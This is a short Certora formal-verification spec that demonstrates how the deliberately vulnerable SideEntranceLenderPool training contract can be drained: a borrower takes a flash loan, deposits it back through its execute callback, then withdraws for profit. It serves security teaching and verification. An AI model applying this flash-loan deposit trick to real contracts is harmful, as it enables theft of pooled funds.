/* Exploiting the vulnerabilities of `SideEntranceLenderPool` */
// https://prover.certora.com/output/98279/1b30e684d514485cbdd85bd405348147?anonymousKey=a59597413ff6b76fab6c0d2af5981d524d596505

using FlashLoanReceiverHarness as burrower;

methods {
    // Requires dispatcher
    function _.execute() external => DISPATCHER(true);
}


/// @title Example of exploiting the `SideEntranceLenderPool`
rule exploitExample(uint256 amount) {
    // Prevent having money already deposited in the pool
    require currentContract.deposits[burrower] == 0;

    uint256 balancePre = nativeBalances[burrower];
    
    // Make the example simpler
    require balancePre == 0;
    require nativeBalances[currentContract] == 100;

    env e;
    require e.msg.sender == burrower;
    flashLoan(e, amount);

    withdraw(e);

    uint256 balancePost = nativeBalances[burrower];

    satisfy balancePost > balancePre;
}
